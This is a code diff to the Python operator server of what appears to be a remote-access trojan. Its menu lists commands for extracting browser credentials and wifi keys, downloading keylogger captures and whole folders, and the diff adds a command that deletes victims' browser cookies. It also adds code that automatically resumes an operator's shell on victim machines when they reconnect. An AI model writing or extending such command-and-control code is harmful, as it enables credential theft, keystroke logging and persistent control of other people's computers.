@@ -191,6 +191,9 @@ class WebSocketServer:
         self.liveaudio_samplerate = 22050
         self.liveaudio_channels = 1
         
+        # Auto-interact after client reconnects (when user was in shell and client reconnected)
+        self.pending_interact = None
+        
         # Browser credential files for server-side decryption
         # Format: session_id -> {'chrome_login': path, 'chrome_state': path, 'edge_login': path, 'edge_state': path}
         self.browser_cred_files = {}
@@ -361,6 +364,9 @@ class WebSocketServer:
             self.cprint(f"\n  {YELLOW}[Windows - Extraction]{RESET}")
             self.cprint(f"  {GREEN}browsercreds{RESET}         - Extract browser credentials & wifi")
             self.cprint(f"  {GREEN}downloadfolder <dir>{RESET} - Download entire folder (zipped)")
+            self.cprint(f"  {GREEN}delcookie{RESET}            - Delete ALL browser cookies")
+            self.cprint(f"  {GREEN}delcookie <domain>{RESET}   - Delete cookies for domain (e.g. google.com)")
+            self.cprint(f"  {GREEN}delcookie <email>{RESET}    - Delete cookies for email domain")
             self.cprint(f"\n  {YELLOW}[Windows - Persistence]{RESET}")
             self.cprint(f"  {GREEN}keylogs{RESET}              - Download keylogger file")
             self.cprint(f"  {GREEN}clearlogs{RESET}            - Clear keylogger file")
@@ -530,7 +536,11 @@ class WebSocketServer:
                             # Check for duplicate session using ClientID (preferred) or computer/user
                             dup_sid = self.find_duplicate_session(session['computer'], session['user'], client_ip, session.get('client_id'))
                             closed_dup = False
+                            was_interacting = False
                             if dup_sid and dup_sid != session_id:
+                                # Check if user was actively interacting with the old session
+                                was_interacting = (self.active_session == dup_sid)
+                                
                                 # Close the older duplicate session silently
                                 try:
                                     old_ws = self.sessions[dup_sid]['websocket']
@@ -541,13 +551,18 @@ class WebSocketServer:
                                     del self.sessions[dup_sid]
                                 if self.active_session == dup_sid:
                                     self.active_session = None
+                                    # Schedule auto-interact with the new session
+                                    self.pending_interact = session_id
                                 closed_dup = True
                             
                             os_label = session['os_type'].upper() if session['os_type'] != 'unknown' else 'UNKNOWN'
                             
                             # Show appropriate message based on reconnect status
                             if session.get('is_quick_reconnect') or closed_dup:
-                                self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET} (reconnected)")
+                                if was_interacting:
+                                    self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET} (reconnected - auto-resuming)")
+                                else:
+                                    self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET} (reconnected)")
                             else:
                                 self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
                 except:
@@ -2005,6 +2020,9 @@ class WebSocketServer:
             while self.running:
                 # Check if session still exists BEFORE prompting
                 if session_id not in self.sessions:
+                    # Check if we're being replaced by a reconnection
+                    if self.pending_interact is not None:
+                        self.cprint(f"\n[*] Session {session_id} reconnected as new session, auto-resuming...")
                     break
                 
                 try:
@@ -2225,6 +2243,15 @@ class WebSocketServer:
         with patch_stdout():
             while self.running:
                 try:
+                    # Check if we need to auto-interact with a reconnected session
+                    if self.pending_interact is not None:
+                        sid = self.pending_interact
+                        self.pending_interact = None
+                        if sid in self.sessions:
+                            self.cprint(f"\n[*] Auto-resuming interaction with session {sid}...")
+                            await self.interact(sid)
+                            continue
+                    
                     # Get current prompt
                     prompt = self.server_prompt()
                     
